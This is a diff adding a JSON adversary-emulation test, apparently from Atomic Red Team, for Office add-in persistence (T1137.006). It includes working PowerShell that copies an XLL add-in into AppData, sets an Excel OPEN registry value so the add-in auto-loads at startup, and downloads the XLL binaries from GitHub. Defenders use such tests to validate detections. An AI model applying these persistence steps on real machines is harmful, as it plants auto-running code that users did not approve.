@@ -1,0 +1,150 @@
+{
+  "id": "9c307886-9fef-41d5-b344-073a0f5b2f5f",
+  "name": "Persistent Code Execution Via Excel Add-in File (XLL)",
+  "description": "Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started\nThe sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "b0e825e3-df42-4759-a638-42cf71feeb3d",
+      "type": "execute-command",
+      "data": {
+        "command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b8db42fd-d2f1-4715-a95b-274f9178a617",
+      "type": "execute-command",
+      "data": {
+        "command": "$ver = (New-Object -COMObject \"Excel.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1f00d31c-7167-4f54-af39-eb030eec6359",
+      "name": "Check dependency 1/2",
+      "description": "Microsoft Excel must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "289cf85a-bcf3-4c4c-9df7-3ff7b9a5bed7",
+      "name": "Resolve dependency 1/2",
+      "description": "Microsoft Excel must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b6ea3e80-1893-4533-b7a8-f196c455ddfa",
+      "name": "Re-check dependency 1/2",
+      "description": "Microsoft Excel must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "84cc420d-1352-417a-b424-bad980f0ff45",
+      "name": "Check dependency 2/2",
+      "description": "XLL files must exist on disk at specified location",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "7a1f66b3-569f-4d83-ab44-a60b1944fc79",
+      "name": "Resolve dependency 2/2",
+      "description": "XLL files must exist on disk at specified location",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\"",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f4c695d1-c54b-47f3-82b5-87e257660175",
+      "name": "Re-check dependency 2/2",
+      "description": "XLL files must exist on disk at specified location",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "b0e825e3-df42-4759-a638-42cf71feeb3d",
+      "p": "on-success",
+      "o": "b8db42fd-d2f1-4715-a95b-274f9178a617"
+    },
+    {
+      "s": "b0e825e3-df42-4759-a638-42cf71feeb3d",
+      "p": "on-failure",
+      "o": "b8db42fd-d2f1-4715-a95b-274f9178a617"
+    },
+    {
+      "s": "1f00d31c-7167-4f54-af39-eb030eec6359",
+      "p": "on-success",
+      "o": "b0e825e3-df42-4759-a638-42cf71feeb3d"
+    },
+    {
+      "s": "1f00d31c-7167-4f54-af39-eb030eec6359",
+      "p": "on-failure",
+      "o": "289cf85a-bcf3-4c4c-9df7-3ff7b9a5bed7"
+    },
+    {
+      "s": "289cf85a-bcf3-4c4c-9df7-3ff7b9a5bed7",
+      "p": "on-success",
+      "o": "b6ea3e80-1893-4533-b7a8-f196c455ddfa"
+    },
+    {
+      "s": "b6ea3e80-1893-4533-b7a8-f196c455ddfa",
+      "p": "on-failure",
+      "o": "b0e825e3-df42-4759-a638-42cf71feeb3d"
+    },
+    {
+      "s": "84cc420d-1352-417a-b424-bad980f0ff45",
+      "p": "on-success",
+      "o": "b0e825e3-df42-4759-a638-42cf71feeb3d"
+    },
+    {
+      "s": "84cc420d-1352-417a-b424-bad980f0ff45",
+      "p": "on-failure",
+      "o": "7a1f66b3-569f-4d83-ab44-a60b1944fc79"
+    },
+    {
+      "s": "7a1f66b3-569f-4d83-ab44-a60b1944fc79",
+      "p": "on-success",
+      "o": "f4c695d1-c54b-47f3-82b5-87e257660175"
+    },
+    {
+      "s": "f4c695d1-c54b-47f3-82b5-87e257660175",
+      "p": "on-failure",
+      "o": "b0e825e3-df42-4759-a638-42cf71feeb3d"
+    }
+  ],
+  "tags": [
+    "T1137.006",
+    "atomic-red-team"
+  ]
+}
